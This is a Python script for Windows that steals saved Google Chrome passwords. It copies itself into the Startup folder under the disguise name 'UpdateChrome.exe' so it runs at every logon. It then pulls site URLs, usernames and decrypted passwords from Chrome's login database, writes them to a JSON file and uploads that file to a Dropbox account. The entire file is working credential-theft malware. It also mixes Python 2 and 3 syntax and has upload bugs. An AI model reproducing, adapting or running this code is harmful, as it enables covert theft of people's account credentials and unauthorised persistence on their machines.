import os
import sys
import sqlite3
import json
import datetime
import dropbox
from dropbox.files import WriteMode

try:
    import win32crypt
except:
    pass


def move_to_startup():
    aup = os.environ.get("ALLUSERSPROFILE")
    up = os.environ.get("USERPROFILE")
    if aup and up:
        before = os.path.join(up, "Downloads", "UpdateChrome.exe")
        after = os.path.join(aup, "Start menu", "Programs", "startup", "UpdateChrome.exe")
        try:
            os.rename(
                before,
                after)
        except Exception as e:
            print("Could not move file UpdateChrome.exe:   " + str(e))
    else:
        print("Oops, couldn't look up stuff in os.environ")
    print("Moved   " + before + "   to   " + after)


def main():
    move_to_startup()
    info_list = []
    path = getpath()
    try:
        connection = sqlite3.connect(path + "Login Data")
        with connection:
            cursor = connection.cursor()
            v = cursor.execute(
                'SELECT action_url, username_value, password_value FROM logins')
            value = v.fetchall()
        for origin_url, username, password in value:
            password = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
            if password:
                info_list.append({
                    'origin_url': origin_url,
                    'username': username,
                    'password': str(password)
                })

    except sqlite3.OperationalError as e:
        e = str(e)
        if e == 'database is locked':
            print('[!] Make sure Google Chrome is not running in the background')
        elif e == 'no such table: logins':
            print'[!] Something wrong with the database name'
        elif e == 'unable to open database file':
            print('[!] Something wrong with the database path')
        else:
            print(e)
        sys.exit(0)

    output_json(info_list)


def getpath():
    path_name = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
    if not os.path.isdir(path_name):
        print('[!] Chrome is not installed')
        sys.exit(0)

    return path_name


def upload_to_dropbox(json_file, file_name):
    access_token = '<ENTER YOURS HERE>'
    client = dropbox.Dropbox(access_token)
    response = client.files_upload(json_file.read(), '/' + file_name, mode=WriteMode('overwrite'))
    print "uploaded:", response


def output_json(info):
    try:
        file_name = 'chromepass-passwords-' + str(datetime.date.today()) + '.json'
        file_path = os.path.join(os.environ.get("USERPROFILE"), 'Documents', file_name)
        with open(file_path, 'w+') as json_file:
            json.dump({'password_items': info}, json_file)
            print("Data written to   " + file_name)
            upload_to_dropbox(json_file, file_name)
    except EnvironmentError:
        print('EnvironmentError: cannot write data')


if __name__ == '__main__':
    main()
